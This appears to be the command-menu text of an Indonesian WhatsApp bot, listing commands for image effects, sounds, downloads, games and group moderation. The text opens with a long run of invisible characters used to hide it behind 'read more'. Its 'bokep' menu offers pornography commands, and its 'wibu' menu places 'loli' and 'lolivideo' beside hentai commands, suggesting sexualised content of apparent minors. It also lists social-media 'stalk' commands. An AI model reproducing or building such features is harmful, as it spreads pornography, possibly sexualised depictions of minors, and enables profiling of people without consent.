͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
 *𝑰𝑵𝑭𝑶 𝑴𝑬𝑵𝑼🌹*
 
⚡ᴄᴇᴋᴘʀᴇғɪx
⚡${prefix}ʙᴏᴛsᴛᴀᴛ
⚡${prefix}ʟɪᴍɪᴛ
⚡${prefix}ɢʟɪᴍɪᴛ
⚡${prefix}ʙᴜʏʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴜʏɢʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴀʟᴀɴᴄᴇ
⚡${prefix}ʀᴜɴᴛɪᴍᴇ
⚡${prefix}sᴘᴇᴇᴅ
⚡${prefix}ᴏᴡɴᴇʀ
⚡${prefix}ᴅᴏɴᴀsɪ
⚡${prefix}ʀᴜʟᴇs
⚡${prefix}ʀᴇᴘᴏʀᴛ <ʙᴜɢ ɴʏᴀ>
⚡${prefix}sᴏᴜʀᴄᴇᴄᴏᴅᴇ
⚡${prefix}ʟɪsᴛᴘʀᴇᴍɪᴜᴍ
⚡${prefix}ᴛᴀɢᴍᴇ
⚡${prefix}ʟɪsᴛʙᴀɴ
⚡${prefix}ʟɪsᴛʙᴏᴛ
⚡${prefix}sɴᴋ

 *𝑵𝑬𝑾 𝑭𝑰𝑻𝑼𝑹🌹*
 
🎬${prefix}ᴘᴀɴᴅᴀ
🎬${prefix}ᴘᴀɴᴅᴀ1
🎬${prefix}ʙɪʀᴅ
🎬${prefix}ᴋᴏᴀʟᴀ
🎬${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
🎬${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
🎬${prefix}ᴛᴛs <ᴋᴏᴅᴇ ʙᴀʜᴀsᴀ>
🎬${prefix}ʏᴛɢᴏʟᴅ <ᴛᴇᴋs>
🎬${prefix}ʏᴛsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎬${prefix}ʟᴏɢᴏᴀ <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}pornhub <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}ᴛᴀʜᴛᴀ <ᴛᴇᴋs>
🎬${prefix}ᴍᴀʀᴠᴇʟ <ᴛᴇᴋs&ᴛᴇᴋs
🎬${prefix}ᴡᴀʟʟ <ᴛᴇᴋs>
🎬${prefix}ᴛᴜᴘᴀɪ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ʙᴀss <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢʜᴏsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢᴇᴍᴏᴋ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ғᴀsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>


 *𝑶𝑾𝑵𝑬𝑹 𝑴𝑬𝑵𝑼🌹*
 
☃️> ᴇᴠᴀʟ
☃️$ ᴇxᴇᴄᴏᴛ
☃️+<>+ <ᴋᴜᴅᴇᴛ>
☃️${prefix}sᴇʟғ
☃️${prefix}ᴘᴜʙʟɪᴄ
☃️${prefix}ʀᴇsᴛᴀʀᴛ
☃️${prefix}ᴀɴᴛɪᴛᴀɢ <ᴏɴ/ᴏғ>
☃️${prefix}ᴏɴ
☃️${prefix}ᴏғғ
☃️${prefix}ʀᴇsᴇᴛʟɪᴍɪᴛ
☃️${prefix}sᴇᴛᴘᴘ
☃️${prefix}sᴇᴛɴᴀᴍᴇ
☃️${prefix}sᴇᴛʙɪᴏ
☃️${prefix}sᴇᴛᴘʀᴇғɪx
☃️${prefix}ʙᴄ
☃️${prefix}ʙʟᴏᴄᴋ
☃️${prefix}ᴜɴʙʟᴏᴄᴋ
☃️${prefix}ʙᴀɴ
☃️${prefix}ᴜɴʙᴀɴ
☃️${prefix}ᴄʟᴇᴀʀᴀʟʟ
☃️${prefix}sᴇᴛᴄᴍᴅ
☃️${prefix}ᴅᴇʟᴄᴍᴅ
☃️${prefix}ᴇxɪғ <ɴᴀᴍᴀ|ᴀᴜᴛʜᴏʀ>
☃️${prefix}ᴀᴅᴅsᴇᴡᴀ <ʟɪɴᴋ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟsᴇᴡᴀ <ɪᴅ ɢʀᴜᴘ>
☃️${prefix}ᴀᴅᴅᴘʀᴇᴍ <ᴛᴀɢ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟᴘʀᴇᴍ <ᴛᴀɢ>

 *𝑶𝑻𝑯𝑬𝑹 𝑴𝑬𝑵𝑼🌹*
 
🏮${prefix}ʙʀᴀɪɴʟʏ
🏮${prefix}sʜᴏᴘᴇᴇ
🏮${prefix}ᴘʟᴀʏsᴛᴏʀᴇ
🏮${prefix}ssᴡᴇʙ
🏮${prefix}ɪᴍᴀɢᴇ
🏮${prefix}ɢᴏᴏɢʟᴇ
🏮${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
🏮${prefix}ɴᴜʟɪs
🏮${prefix}ɪɢᴜsᴇʀ
🏮${prefix}ɪɢsᴛᴀʟᴋ
🏮${prefix}ɢɪᴛʜᴜʙsᴛᴀʟᴋ
🏮${prefix}ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
🏮${prefix}ɪᴍɢ2ᴜʀʟ
🏮${prefix}ʏᴛsᴇᴀʀᴄʜ
🏮️${prefix}ʀᴇᴀᴅᴍᴏʀᴇ <ᴛᴇxᴛ𝟷|ᴛᴇxᴛ𝟸>

 𝑷𝑯𝑶𝑻𝑶 𝑶𝑿𝒀🌹

📸${prefix}ᴄᴀʀᴠᴇᴅᴡᴏᴏᴅ <ᴛᴇᴋs>
📸${prefix}ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ғʟᴀᴍᴍɪɴɢ <ᴛᴇᴋs>
📸${prefix}ғᴀʟʟʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}ɢʟᴏᴡɪɴɢɴᴇᴏɴ <ᴛᴇᴋs>
📸${prefix}ʟᴇᴛᴛᴇʀʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀɴᴀᴛᴜʀᴇ <ᴛᴇᴋs>
📸${prefix}ɢᴏʟᴅᴇʀʀᴏsᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀᴡᴀᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ɴᴀᴛᴜʀᴇ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏʟғᴍᴇɴᴛᴀʟ <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅᴇɴʙᴏᴀʀᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅʜᴇᴀʀᴛ <ᴛᴇᴋs>
📸${prefix}ᴄᴏғғᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀɢʀᴀss <ᴛᴇᴋs>
📸${prefix}ʟᴏᴠᴇᴍᴇssᴀɢᴇ <ᴛᴇᴋs>
📸${prefix}ʙᴜʀɴᴘᴀᴘᴇʀ <ᴛᴇᴋs>
📸${prefix}sᴍᴏᴋᴇ <ᴛᴇᴋs>
📸${prefix}ʀᴏᴍᴀɴᴄᴇ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ1 <ᴛᴇᴋs>
📸${prefix}sʜᴀᴅᴏᴡ <ᴛᴇᴋs>

 𝑻𝑬𝑿𝑻𝑷𝑹𝑶𝑴𝑬🌹

🎄${prefix}ɴᴇᴏɴʟɪɢʜᴛ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ <ᴛᴇᴋs>
🎄${prefix}ғᴜᴛᴜʀᴇɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴡʀɪᴛɪɴɢ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅsᴜᴍᴍᴇʀ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴇɴɢʀᴀᴠᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ᴍᴇᴛᴀʟᴅᴀʀᴋ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʟᴏɢʀᴀᴘʜɪᴄ <ᴛᴇᴋs>
🎄${prefix}ᴛᴇxᴛ1917 <ᴛᴇᴋs>
🎄${prefix}ᴍɪɴɪᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴅᴇʟᴜxᴇsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴡʏᴇᴀʀᴄᴀʀᴅ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴏᴏᴅғʀᴏsᴛᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴀʟʟᴏᴡᴇɴ <ᴛᴇᴋs>
🎄${prefix}ᴊᴏᴋᴇʀʟᴏɢᴏ <ᴛᴇᴋs>
🎄${prefix}ғɪʀᴇᴡᴏʀᴋsᴘᴀʀᴋʟᴇ <ᴛᴇᴋs>
🎄${prefix}ɴᴀᴛᴜʀᴇʟᴇᴀᴠᴇs <ᴛᴇᴋs>
🎄${prefix}ʙᴏᴋᴇʜ <ᴛᴇᴋs>
🎄${prefix}ᴛᴏxɪᴄ <ᴛᴇᴋs>
🎄${prefix}sᴛʀᴀᴡʙᴇʀʀʏ <ᴛᴇᴋs>
🎄${prefix}ʙᴏx3ᴅ <ᴛᴇᴋs>
🎄${prefix}ʀᴏᴀᴅᴡᴀʀɴɪɴɢ <ᴛᴇᴋs>
🎄${prefix}ʙʀᴇᴀᴋᴡᴀʟʟ <ᴛᴇᴋs>
🎄${prefix}ɪᴄᴇᴄᴏʟᴅ <ᴛᴇᴋs>
🎄${prefix}sᴜᴍᴍᴇʀsᴀɴᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʀʀᴏʀʙʟᴏᴏᴅ <ᴛᴇᴋs>
🎄${prefix}ᴛʜᴜɴᴅᴇʀ <ᴛᴇᴋs>

 𝑬𝑷𝑯𝑶𝑻𝑶 𝟑𝟔𝟎🌹

🌐${prefix}ғʀᴇᴇғɪʀᴇ <ᴛᴇᴋs>
🌐${prefix}sɴᴏᴡ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ʙɪʀᴛᴅᴀʏᴅᴀʏ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏʙᴀᴛ <ᴛᴇᴋs>
🌐${prefix}ᴡʀɪᴛᴇɢᴀʟᴀᴄʏ <ᴛᴇᴋs>  
🌐${prefix}ᴛᴇxᴛʙʏɴᴀᴍᴇ <ᴛᴇᴋs>
🌐${prefix}ᴡᴏᴏᴅᴇɴ3ᴅ <ᴛᴇᴋs> 
🌐${prefix}sᴛᴀʀsɴɪɢʜᴛ <ᴛᴇᴋs>
🌐${prefix}ᴛᴇxᴛᴄᴀᴋᴇ <ᴛᴇᴋs>  
🌐${prefix}ɢʟɪᴛᴛᴇʀɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ɴᴏᴇʟᴛᴇxᴛ <ᴛᴇᴋs> 
🌐${prefix}ᴍᴇᴛᴀʟʟᴏɢᴏ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴʙᴜsʜ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🌐${prefix}ɢʟᴏssʏᴄʜʀᴏᴍᴇ <ᴛᴇᴋs>  
🌐${prefix}ʜᴏʟᴏɢʀᴀᴍ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏsᴛʏʟᴇ <ᴛᴇᴋs>  
🌐${prefix}ʙʀɪᴛʜᴅᴀʏᴄᴀᴋᴇ <ᴛᴇᴋs>
🌐${prefix}ʜᴇᴀʀᴛsʜᴀᴘᴇᴅ <ᴛᴇᴋs> 
🌐${prefix}ʀᴏʏᴀʟᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ᴘᴜᴘᴘʏᴄᴜᴛᴇ <ᴛᴇᴋs>
🌐${prefix}ʙᴇᴀᴜᴛɪғᴜʟғʟᴏᴡᴇʀ <ᴛᴇᴋs>  
🌐${prefix}ʟɪɢʜᴛᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ <ᴛᴇᴋs>
🌐${prefix}ʟᴜxᴜʀʏɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ᴡᴀᴛᴇʀᴄᴏʟᴏʀ <ᴛᴇᴋs>
🌐${prefix}ᴍᴜʟᴛɪᴄᴏʟᴏʀ3ᴅ <ᴛᴇᴋs>  
🌐${prefix}ᴡᴇᴛɢʟᴀss <ᴛᴇᴋs>

 *𝑺𝑶𝑼𝑵𝑫 𝑴𝑬𝑵𝑼🌹*
 
🎶${prefix}sᴏᴜɴᴅ
🎶${prefix}sᴏᴜɴᴅ1
🎶${prefix}sᴏᴜɴᴅ2
🎶${prefix}sᴏᴜɴᴅ3
🎶${prefix}sᴏᴜɴᴅ4
🎶${prefix}sᴏᴜɴᴅ5
🎶${prefix}sᴏᴜɴᴅ6
🎶${prefix}sᴏᴜɴᴅ7
🎶${prefix}sᴏᴜɴᴅ8
🎶${prefix}sᴏᴜɴᴅ9
🎶${prefix}sᴏᴜɴᴅ10
🎶${prefix}sᴏᴜɴᴅ11
🎶${prefix}sᴏᴜɴᴅ12
🎶${prefix}sᴏᴜɴᴅ13
🎶${prefix}sᴏᴜɴᴅ14
🎶${prefix}sᴏᴜɴᴅ15
🎶${prefix}sᴏᴜɴᴅ16
🎶${prefix}sᴏᴜɴᴅ17
🎶${prefix}sᴏᴜɴᴅ18
🎶${prefix}sᴏᴜɴᴅ19
🎶${prefix}sᴏᴜɴᴅ20

 *𝑩𝑶𝑲𝑬𝑷 𝑴𝑬𝑵𝑼🌹*
 
🌚${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
🌚${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ1
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ2
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ4
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ5
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ6
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ7
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ8
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ9
🌚${prefix}ʀᴀɴᴅᴏᴍʙᴏᴋᴇᴘ

*𝑾𝑰𝑩𝑼 𝑴𝑬𝑵𝑼🌹*
 
🧄${prefix}ʟᴏʟɪ
🧄${prefix}ᴍᴀɴɢᴀ
🧄${prefix}ᴀɴɪᴍᴇ
🧄${prefix}ʟᴏʟɪᴠɪᴅᴇᴏ
🧄${prefix}ʜᴜsʙᴜ
🧄${prefix}ᴡᴀɪғᴜ
🧄${prefix}ᴍɪʟғ
🧄${prefix}ɴᴇᴋᴏ
🧄${prefix}ᴋᴀɴɴᴀ
🧄${prefix}sᴀɢɪʀɪ
🧄${prefix}ʜᴇɴᴛᴀɪ
🧄${prefix}ᴄᴏsᴘʟᴀʏ
🧄${prefix}ᴡᴀʟʟɴɪᴍᴇ
🧄${prefix}ᴋᴜsᴏɴɪᴍᴇ
🧄${prefix}ᴍᴇɢᴜᴍɪɴ
🧄${prefix}ᴏᴛᴀᴋᴅᴇsᴜ
🧄${prefix}ᴅᴏᴜᴊɪɴᴅᴇsᴜ
🧄${prefix}sᴛᴏʀʏᴀɴɪᴍᴇ
🧄${prefix}ɴᴀᴋᴀɴᴏᴍɪᴋᴜ
🧄${prefix}ɴᴀᴋᴀɴᴏɴɪɴᴏ
🧄${prefix}ɴᴀᴋᴀɴᴏɪᴛsᴜᴋɪ
🧄${prefix}ᴏᴛᴀᴋᴜᴏɴɢᴏɪɴɢ
🧄${prefix}ɴʜᴇɴᴛᴀɪ
🧄${prefix}ɴɴᴇᴋᴏᴘᴏɪ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪ3ᴅ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪᴄᴏsᴘʟᴀʏ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪsᴇᴀʀᴄʜ

 *𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 𝑴𝑬𝑵𝑼🌹*
 
🔋${prefix}ғᴀᴄᴇʙᴏᴏᴋ <ᴜʀʟ>
🔋${prefix}ɴᴛʜᴇɴᴛᴀɪᴘɢғ <ᴜʀʟ>
🔋${prefix}ᴛɪᴋᴛᴏᴋ <ᴜʀʟ>
🔋${prefix}twitter <ᴜʀʟ>
🔋${prefix}tiktoknowm <ᴜʀʟ>
🔋${prefix}igdl <ᴜʀʟ>
🔋${prefix}ytmp3 <ᴜʀʟ>
🔋${prefix}ytmp4 <ᴜʀʟ>
🔋${prefix}mediafire <ᴜʀʟ>
🔋${prefix}soundcloud <ᴜʀʟ>
🔋${prefix}tiktokaudio <ᴜʀʟ>
🔋${prefix}play <ǫᴜᴇʀʏ>

 *𝑮𝑹𝑼𝑷 𝑴𝑬𝑵𝑼🌹*
 
⚙️${prefix}ᴀғᴋ
⚙️${prefix}ɴᴏᴛɪғ <ᴛᴇᴋs>
⚙️${prefix}ɪɴғᴏɢʀᴜᴘ
⚙️${prefix}ᴄʜᴀᴛɪɴғᴏ
⚙️${prefix}ᴋɪᴄᴋ <ᴛᴀɢ>
⚙️${prefix}ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ʟɪɴᴋɢᴄ
⚙️${prefix}ʟᴇᴀᴠᴇ
⚙️${prefix}sᴇᴛᴅᴇsᴄ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛɢᴛᴜᴘɴᴀᴍᴇ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛᴘᴘɢʀᴜᴘ <ғᴏᴛᴏ>
⚙️${prefix}ɢʀᴜᴘsᴇᴛᴛɪɴɢ
⚙️${prefix}ᴛᴀɢᴀʟʟ
⚙️${prefix}ʜɪᴅᴇᴛᴀɢ <ᴛᴇᴋs>
⚙️${prefix}ᴍᴜᴛᴇ
⚙️${prefix}ᴜɴᴍᴜᴛᴇ
⚙️${prefix}ᴀɴᴛɪʟɪɴᴋ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴡᴇʟᴄᴏᴍᴇ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴀɴᴛɪʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ʟɪsᴛʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴀᴅᴅʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴅᴇʟʙᴀᴅᴡᴏʀᴅ

 *𝑺𝑻𝑰𝑪𝑲𝑬𝑹 𝑴𝑬𝑵𝑼🌹*
 
☕${prefix}ᴅᴀᴅᴜ
☕${prefix}ᴅᴏɢᴇ
☕${prefix}ᴛᴏɪᴍɢ
☕${prefix}ᴘᴀᴛʀɪᴄᴋ
☕${prefix}ɢᴀʀᴡɢᴜʀᴀ
☕${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
☕${prefix}ᴛᴛɢ <ᴛᴇᴋs>
☕${prefix}ᴀᴛᴛᴘ <ᴛᴇᴋs>
☕${prefix}sᴛɪᴄᴋᴇʀᴀɴɪᴍᴇ
☕${prefix}sᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}ᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}sᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ғᴏᴛᴏ / ᴠɪᴅᴇᴏ>
☕${prefix}sᴍᴇᴍᴇ
☕${prefix}sᴡᴍ
☕${prefix}ᴛᴀᴋᴇ
☕${prefix}ᴛᴏᴠɪᴅᴇᴏ

 *𝑮𝑨𝑴𝑬 𝑴𝑬𝑵𝑼🌹*
 
🎮${prefix}sʟᴏᴛ
🎮${prefix}ʟɪᴍɪᴛɢᴀᴍᴇ
🎮${prefix}ɢᴇʟᴜᴅ <ᴛᴀɢ>
🎮${prefix}ᴛɪᴄᴛᴀᴄᴛᴏᴇ <ᴛᴀɢ>
🎮${prefix}sɪᴀᴘᴀᴀᴋᴜ
🎮${prefix}ғᴀᴍɪʟʏ100
🎮${prefix}ᴋᴜɪsᴍᴀᴛʜ
🎮${prefix}ᴀsᴀʜᴏᴛᴀᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟɪʀɪᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟᴀɢᴜ
🎮${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
🎮${prefix}sᴜsᴜɴᴋᴀᴛᴀ
🎮${prefix}ᴋɪᴍɪᴀᴋᴜɪs
🎮${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
🎮${prefix}ᴛᴇʙᴀᴋᴊᴇɴᴀᴋᴀ
🎮${prefix}ᴛᴇʙᴀᴋᴀɴɪᴍᴇ
🎮${prefix}ᴛᴇʙᴀᴋᴛᴇʙᴀᴋᴀɴ
🎮${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
🎮${prefix}ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
🎮${prefix}sᴜɪᴛ <ʙᴀᴛᴜ/ᴋᴇʀᴛᴀs/ɢᴜɴᴛɪɴɢ>

 *𝑭𝑼𝑵 𝑴𝑬𝑵𝑼🌹*
 
🙆‍♂️${prefix}ᴍɪɴɪɴɢ
🙆‍♂️${prefix}ᴛᴏɢᴇʟ
🙆‍♂️${prefix}ᴄᴇᴋᴡᴀᴛᴀᴋ
🙆‍♂️${prefix}ᴄᴇᴋᴍᴀᴛɪ
🙆‍♂️${prefix}ᴡᴀɴɢʏ
🙆‍♂️${prefix}ᴄɪᴛᴀᴄɪᴛᴀ
🙆‍♂️${prefix}ᴛᴏxɪᴄ
🙆‍♂️${prefix}ᴛʀᴜᴛʜ
🙆‍♂️${prefix}ᴅᴀʀᴇ
🙆‍♂️${prefix}ᴀᴘᴀᴋᴀʜ
🙆‍♂️${prefix}ʙɪsᴀᴋᴀʜ
🙆‍♂️${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
🙆‍♂️${prefix}ʀᴀᴛᴇ
🙆‍♂️${prefix}ᴊᴀᴅɪᴀɴ
🙆‍♂️${prefix}ᴄᴀɴᴛɪᴋ
🙆‍♂️${prefix}ɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ʙᴇʙᴀɴ
🙆‍♂️${prefix}ʙᴀʙɪ
🙆‍♂️${prefix}ᴄᴇᴋɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ᴄᴇᴋᴄᴀɴᴛɪᴋ
